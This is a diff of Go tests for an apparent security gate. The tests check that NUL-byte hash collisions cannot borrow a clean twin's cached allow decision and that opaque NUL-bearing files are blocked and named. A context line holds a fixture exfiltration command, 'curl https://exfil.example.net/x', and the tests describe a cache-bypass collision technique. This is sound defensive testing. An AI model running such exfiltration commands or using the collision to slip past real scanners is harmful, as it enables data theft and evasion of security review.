@@ -83,6 +83,84 @@ func TestDetectorsAgainstCapabilities(t *testing.T) {
 	}
 }
 
+func TestOpaqueNULBlocksEvenWhenAV1TwinHasCachedAllow(t *testing.T) {
+	nulTree := t.TempDir()
+	cleanTwin := t.TempDir()
+	writeFiles(t, nulTree, map[string][]byte{
+		"assets/a.bin": []byte("x\x00docs/b.md\x00y"),
+	})
+	writeFiles(t, cleanTwin, map[string][]byte{
+		"assets/a.bin": []byte("x"),
+		"docs/b.md":    []byte("y"),
+	})
+	leftHash, err := hashing.ContentSHA256(nulTree, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	rightHash, err := hashing.ContentSHA256(cleanTwin, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if leftHash != rightHash {
+		t.Fatalf("v1 framing did not collide: %s != %s", leftHash, rightHash)
+	}
+
+	cfg := newCfg(t, "advisory", "off")
+	clean := Subject{Name: "clean-twin", Snapshot: cleanTwin, SchemaVersion: 3, Capabilities: capabilities.ImplicitNone()}
+	if warnings, errs := Gate(cfg, []Subject{clean}); len(errs) != 0 || len(warnings) != 0 {
+		t.Fatalf("NUL-free twin: warnings=%v errs=%v", warnings, errs)
+	}
+	if findings, hit := loadCachedFindings(cfg, leftHash); !hit || len(findings) != 0 {
+		t.Fatalf("clean twin cache = (%+v, hit=%v), want cached allow", findings, hit)
+	}
+
+	opaque := Subject{Name: "nul-tree", Snapshot: nulTree, SchemaVersion: 3, Capabilities: capabilities.ImplicitNone()}
+	if _, errs := Gate(cfg, []Subject{opaque}); len(errs) == 0 {
+		t.Fatal("NUL-bearing tree was admitted from its clean twin's cached allow")
+	}
+	report, err := auditSubject(cfg, opaque, false)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if report.Decision != DecisionBlock || report.CacheHit || len(report.Findings) != 1 || report.Findings[0].ID != findingOpaqueNUL || report.Findings[0].File != "assets/a.bin" {
+		t.Fatalf("opaque report %+v, want an uncached blocking finding naming assets/a.bin", report)
+	}
+}
+
+func TestGateBlocksDeepOpaqueNULWhenAuditIsDisabledAndNamesFile(t *testing.T) {
+	snapshot := t.TempDir()
+	writeFiles(t, snapshot, map[string][]byte{
+		"docs/deep/opaque.unsupported": []byte("prefix\x00suffix"),
+	})
+	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json")}
+	if cfg.Audit.Enabled {
+		t.Fatal("test requires the default disabled audit configuration")
+	}
+
+	warnings, errs := Gate(cfg, []Subject{{
+		Name: "opaque-skill", Snapshot: snapshot, SchemaVersion: 3,
+		Capabilities: capabilities.ImplicitNone(),
+	}})
+	if len(warnings) != 0 || len(errs) != 1 ||
+		!strings.Contains(errs[0], findingOpaqueNUL) ||
+		!strings.Contains(errs[0], "docs/deep/opaque.unsupported") {
+		t.Fatalf("Gate with disabled audit = warnings %v, errors %v; want a blocking file-naming opaque finding", warnings, errs)
+	}
+}
+
+func writeFiles(t *testing.T, root string, files map[string][]byte) {
+	t.Helper()
+	for name, content := range files {
+		path := filepath.Join(root, filepath.FromSlash(name))
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, content, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
 func TestGateModes(t *testing.T) {
 	subject := subjectWith(t, "curl https://exfil.example.net/x\n", capabilities.ImplicitNone(), 3)
 
